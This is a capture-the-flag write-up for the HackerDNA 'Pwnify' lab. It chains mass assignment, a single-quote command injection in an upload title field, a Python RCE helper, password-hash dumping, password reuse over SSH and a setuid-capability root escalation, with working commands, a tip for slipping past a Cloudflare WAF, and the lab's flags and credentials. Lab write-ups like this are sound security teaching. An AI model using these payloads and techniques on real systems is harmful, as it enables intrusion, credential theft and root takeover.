# Pwnify — Web Application Penetration Testing (Hackerdna.com)



{{< admonition tldr "TL;DR" >}}

**Pwnify — Web Application Penetration Testing (hackerdna.com)** is a pwn challenge from **HackerDNA**. **Difficulty:** Hard | **Updated:** 25 Aug 2026 | **Free Access**

{{< /admonition >}}

**Difficulty:** Hard | **Updated:** 25 Aug 2026 | **Free Access**

**Target:** `lab-3-249-145-98.hdna.me` (old instance: `lab-34-243-174-95.hdna.me` — killed by Cloudflare 1016)

**Tags:** Mass Assignment · Command Injection · Hash Cracking · Password Reuse · Linux Privilege Escalation · Linux Capabilities

---

## Summary

Pwnify is a music-streaming application (Flask + SQLite) for pentest practice. Complete chain:

```
Mass Assignment → Command Injection (RCE) → Hash/Password Extraction
→ Password Reuse (SSH) → Linux Capabilities (PrivEsc) → root
```

**Flags:**
- User flag: `8877c447-c4f7-4f5d-b65c-3400958fd7da` ( `/home/djcarter/flag-user.txt` )
- Root flag: `4b097a8e-7de1-4688-8f81-f36cf5208abe` ( `/root/flag-root.txt` )

---

## 1. Recon

```
$ curl -i https://lab-3-249-145-98.hdna.me/
HTTP/2 200  |  server: cloudflare  |  content-type: text/html
```

- Flask + Jinja2 (a typical Werkzeug error page), behind Cloudflare.
- Public routes: `/` , `/search?q=` , `/register` , `/login` , `/cover.svg?k=&t=` , `/track/<id>` , `/artist/<id>` , `/album/<id>` .
- API (arises from inline JS): `/api/me` , `/api/profile` , `/api/playlist` , `/api/my_playlists` , `/api/playlist/<id>/tracks` .
- `/cover.svg?k=<seed>&t=<text>` — cover generator: `k` hashed to hue ( `hsl(...)` ), `t` to SVG text. **Not** command injection (tested: `$((50+50))` , ` ` ` id ` ` `, ` ;sleep` → all literals, hue = string deterministic hash).

**Key insight:** register → upload track → page `/track/<id>` has a **"Processing output"** panel ( `<pre class="log">` ) that displays the ffmpeg log encoder + "tag check" results. This is a reflected RCE sink.

---

## 2. Mass Assignment — become an Artist

Normal account registration:

```
$ curl -c c.txt -X POST https://lab-3-249-145-98.hdna.me/register \
    -d "username=ctfuser99&email=ctf99@x.com&password=ctfpass99"
→ 302 Set-Cookie: session=eyJ1aWQiOjd9...

$ curl -b c.txt https://lab-3-249-145-98.hdna.me/api/me
{"bio":"","display_name":"ctfuser99","email":"ctf99@x.com","id":7,
 "is_artist":false,"role":"user","username":"ctfuser99"}
```

`POST /api/profile` accepts JSON. Whitelist fields updateable: `display_name` , `email` , `bio` , `is_artist` ( `role` rejected: `{"error":"no updatable fields"}` ). Overwrite `is_artist` :

```
$ curl -b c.txt -X POST https://lab-3-249-145-98.hdna.me/api/profile \
    -H "Content-Type: application/json" -d '{"is_artist": true}'
{"ok":true,"updated":["is_artist"]}

$ curl -b c.txt https://lab-3-249-145-98.hdna.me/api/me
{"is_artist":true, ...}
```

Without `is_artist=true` , `/studio/upload` reply **403**. After that the **Artist Studio** menu appears → you can upload tracks.

---

## 3. Command Injection → RCE

Endpoint: `POST /studio/upload` (multipart: `title` + `audio` ). Server running:

```bash
ffmpeg -i uploads/raw_up_<uid>_<hash>.mp3 -metadata title='$title' uploads/up_<uid>_<hash>.mp3
# lalu "tag check" (membaca tag file output)
```

Log on track page:

```
Input #0, mp3, from '/var/www/pwnify/uploads/raw_up_7_xxx.mp3':
Output #0, mp3, to '/var/www/pwnify/uploads/up_7_xxx.mp3':
  Metadata:
    TIT2            : test
...
--- tag check ---
test
```

**Vuln:** title entered into command shell with **single quotes** without proper escaping → breakout `test';<CMD>;'` .

### Crucial pitfall #1 — curl -F cuts payload on `;` `curl -F 'title=test;id'` considers `;` as a multipart field separator → payload is truncated to `title=test` before reaching the server. **Solution:** use Python `requests` ( `data=` + `files=` ) or `curl --form-string` .

### Crucial pitfall #2 — Cloudflare WAF blocks the default curl User-Agent `curl` no UA → **403**; with UA browser → pass. Python `requests` with browser UA header is also safe.

### Proof of concept

```python
import requests, re, html as html_mod

s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'})
s.post('https://lab-3-249-145-98.hdna.me/login',
       data={'username': 'ctfuser99', 'password': 'ctfpass99'}, allow_redirects=False)

def run_cmd(cmd):
    files = {'audio': ('sine.mp3', open('/tmp/sine.mp3', 'rb'), 'audio/mpeg')}
    data = {'title': f"test';{cmd};'"}
    r = s.post('https://lab-3-249-145-98.hdna.me/studio/upload',
               data=data, files=files, allow_redirects=False, timeout=45)
    tid = re.search(r'/track/(\d+)', r.headers['Location']).group(1)
    r2 = s.get(f'https://lab-3-249-145-98.hdna.me/track/{tid}')
    log = html_mod.unescape(re.search(r'<pre class="log">(.*?)</pre>', r2.text, re.S).group(1))
    return '\n'.join(l for l in log.split('\n') if 'ffmpeg version' not in l).strip()

print(run_cmd('id'))
```

Output in log:

```
uid=999(pwnify) gid=999(pwnify) groups=999(pwnify)
```

**RCE as user `pwnify` (uid 999), cwd `/var/www/pwnify` .** All command output is reflected in the log (blind not necessary — full read).

### Enumerations

```
$ run_cmd('ls -la')
app.py  seed.py  instance/  uploads/  static/  templates/

$ run_cmd('cat /etc/passwd')
pwnify:x:999:999::/home/pwnify:/usr/sbin/nologin
djcarter:x:1000:1001:DJ Carter - Founder:/home/djcarter:/bin/bash
transcoder:x:1001:1002::/home/transcoder:/bin/bash
```

---

## 4. Hash Cracking & Password Extraction `/var/www/pwnify/seed.py` (can be read via RCE) contains:

```python
# This password is reused as the djcarter UNIX/SSH password in the Dockerfile.
# It must exist in rockyou.txt. Plain alphanumeric (no shell-special chars).
DJCARTER_PASSWORD = "blink182"
```

Dump users table from SQLite:

```
$ run_cmd('python3 -c "import sqlite3;c=sqlite3.connect(chr(47)+...);print(...)"')

(1, 'djcarter',  'djcarter@pwnify.hdna', '6104df369888589d6dbea304b59a32d4', 'admin', 1, ...)
(2, 'lena.fox',  ..., 'scrypt:32768:8:1$...', 'user', 0, ...)
(3, 'marcus_b',  ..., '7f183e9b73f88d29193dffff1e974eb6', 'user', 0, ...)
(4, 'synthsara', ..., 'scrypt:32768:8:1$...', 'user', 1, ...)
(6, 'ops_kev',   ..., '36c91ce3235443a903938607fc4bea4b', 'user', 0, ...)
```

- `djcarter` (role=**admin**) uses **MD5 legacy** ( `6104df36...` ) — designed as the only hash that can be cracked (self-selects).
- Password `blink182` (from seed.py, found in rockyou) — **reused as SSH password** (comments in seed.py).

---

## 5. Password Reuse → SSH (user flag) `ss -tlnp` from RCE: SSH listens on **127.0.0.1:22 only** (not exposed to outside). SSH login must be from inside the container.

Server doesn't have `sshpass` (and can't apt install — non-root). Trick: **SSH_ASKPASS + setsid**:

```
# di remote, buat helper yang echo password
echo "#!/bin/sh" > /tmp/askpass.sh
echo 'echo blink182' >> /tmp/askpass.sh
chmod +x /tmp/askpass.sh

DISPLAY=:0 SSH_ASKPASS=/tmp/askpass.sh SSH_ASKPASS_REQUIRE=force setsid -w \
  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  djcarter@127.0.0.1 "cat /home/djcarter/flag-user.txt"
```

Output:

```
uid=1000(djcarter) gid=1001(djcarter) groups=1001(djcarter),1000(pwteam)
8877c447-c4f7-4f5d-b65c-3400958fd7da   ← USER FLAG
```

---

## 6. Linux Capabilities → root (root flag)

From the `djcarter` shell :

```
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su /usr/bin/passwd ... /usr/local/bin/pwnify-enc

$ ls -la /usr/local/bin/pwnify-enc
-rwsr-x---. 1 root transcoder 70744 ... pwnify-enc   ← SUID root, group transcoder

$ cat /usr/local/bin/entrypoint.sh
setcap cap_setuid+ep /usr/local/bin/pwnify-enc 2>/dev/null || true
```

** `pwnify-enc` = SUID root:transcoder + capability `cap_setuid+ep` ** (restored at runtime by entrypoint; AWS ECS discards xattr setcap when unpacking image — that's why it is reapplied by PID 1).

- Executable only for group `transcoder` — djcarter (pwteam) cannot directly.
- `/opt/pwnify/transcoder/config.ini` (readable by group `pwteam` ) service credential leak:

```ini
[service]
user = transcoder
password = Tr4nscoderSvc9912
```

SSH as `transcoder` (same SSH_ASKPASS trick), then execute the helper:

```
$ /usr/local/bin/pwnify-enc --uid 0 id
uid=0(root) gid=1002(transcoder) groups=1002(transcoder),1000(pwteam)

$ /usr/local/bin/pwnify-enc --uid 0 cat /root/flag-root.txt
4b097a8e-7de1-4688-8f81-f36cf5208abe   ← ROOT FLAG
```

How `pwnify-enc` works (from strings): `--uid <service-uid> <command>` → `setuid(uid)` → `execvp(command)` . With `cap_setuid+ep` , processes can `setuid(0)` → execute commands as root.

---

## 7. Chain Summary

| Step | Vuln | Results |
|---|---|---|
| 1 | **Mass Assignment** — `POST /api/profile {"is_artist": true}` | Access Artist Studio / upload |
| 2 | **Command Injection** — `test';<cmd>;'` in field `title` upload (single-quote breakout), output reflected in processing log | RCE uid=999 (pwnify) |
| 3 | **Hash Cracking / Leak** — `seed.py` leak `DJCARTER_PASSWORD="blink182"` (MD5 legacy in DB) | Password djcarter |
| 4 | **Password Reuse** — SSH `djcarter:blink182` (via localhost, SSH_ASKPASS trick) | **USER FLAG** |
| 5 | **Linux Capabilities** — `pwnify-enc` SUID+ `cap_setuid+ep` , creds `transcoder:Tr4nscoderSvc9912` from config.ini | `--uid 0` → **ROOT FLAG** |

---

## Pitfalls & Notes

1. ** `curl -F` bypasses `;` ** — payload injection is silently bypassed. Use Python `requests` or `--form-string` .
2. **Cloudflare WAF** — curl default UA hits 403. Always set UA browser.
3. **HTML-escaped log output** — parse with `html.unescape()` .
4. **Blind timing** — initial confirmation: `test';sleep 5;'` = ~6s vs baseline 1.1s.
5. **SSH not exposed** — only 127.0.0.1:22 in the container; `sshpass` does not exist and cannot be installed (non-root) → SSH_ASKPASS + `setsid -w` .
6. **Instances are not permanent** — lab may go down (Cloudflare 530/1016, origin down). The chain must be repeated on a new instance; account & audio files need to be recreated.

## Related Files

- `xploit.py` — complete exploit chain (RCE helper + SSH + priv esc)
- `writeup.md` — this document


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/pwnify/  

